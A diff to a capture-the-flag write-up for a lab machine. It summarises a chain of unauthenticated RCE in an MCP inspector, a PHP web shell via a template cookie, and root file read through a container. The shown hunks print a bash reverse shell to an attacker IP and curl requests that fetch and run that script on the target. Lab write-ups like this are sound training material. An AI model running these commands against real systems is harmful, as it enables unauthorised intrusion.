@@ -12,7 +12,7 @@
 ## Summary
 
 Kobold is an easy Linux machine hosting an Arcane Docker management interface on port 3552.
-Virtual host enumeration reveals two subdomains: `bin.kobold.htb`, running a PrivateBin instance, and `mcp.kobold.htb`, running MCPJam v1.4.2, which is vulnerable to an unauthenticated RCE (CVE-2024-23744). The vulnerability is leveraged to gain a reverse shell as `ben`. `ben` belongs to the `operator` group, which has write access to a world-writable subdirectory inside the PrivateBin data folder. A PHP web shell can be written in the directory and accessed via PrivateBin's template cookie parameter, achieving code execution as `www-data`. The PrivateBin configuration file contains plaintext credentials that grant access to the Arcane instance. From Arcane, a new container is created with the host filesystem mounted, allowing arbitrary file read as root.
+Virtual host enumeration reveals two subdomains: `bin.kobold.htb`, running a PrivateBin instance, and `mcp.kobold.htb`, running MCPJam v1.4.2, which is vulnerable to an unauthenticated RCE (CVE-2026-23744). The vulnerability is leveraged to gain a reverse shell as `ben`. `ben` belongs to the `operator` group, which has write access to a world-writable subdirectory inside the PrivateBin data folder. A PHP web shell can be written in the directory and accessed via PrivateBin's template cookie parameter, achieving code execution as `www-data`. The PrivateBin configuration file contains plaintext credentials that grant access to the Arcane instance. From Arcane, a new container is created with the host filesystem mounted, allowing arbitrary file read as root.
 
 > **Note:** The machine has different IP addresses across sections of this writeup due to multiple restarts.
 
@@ -128,17 +128,19 @@ A reverse shell is obtained by uploading a bash script with the RCE vulnerabilit
 cat shell.sh
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.224/1111 0>&1
+```
 
+```
 python3 -m http.server 8000
 ```
 
 ```shell
-# Stage the shell script on the target
+# Shell upload
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"1"}'
 
-# Execute it
+# Execution
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"1"}'
@@ -160,7 +162,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 **User flag:**
 ```
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
-0d9673a3692aa1a3e0631255bdfa9dca
+0d9***************************a
 ```
 
 ---
